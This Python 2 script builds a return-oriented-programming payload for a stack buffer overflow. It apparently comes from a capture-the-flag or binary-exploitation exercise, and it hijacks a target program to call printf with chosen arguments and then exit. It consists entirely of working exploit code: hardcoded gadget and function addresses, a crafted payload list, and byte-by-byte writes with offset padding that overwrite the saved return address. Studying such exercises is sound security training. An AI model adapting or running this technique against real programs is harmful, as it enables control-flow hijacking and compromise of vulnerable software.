#! /usr/bin/python2
from sys import stdout, stderr

stdout.write("Six factorial is %d.      \x00\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")
payload = [0x00000000] * 6 + [
    0x80512e0,  # printf address
    0x0805ebf9, # pop edx; pop ebx; ret;
    0x80e6ce0, # plaintext  #0x80b40a4, # format string
    125, # argument to printf %d argument
    0x080507f0,  # exit address
]

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
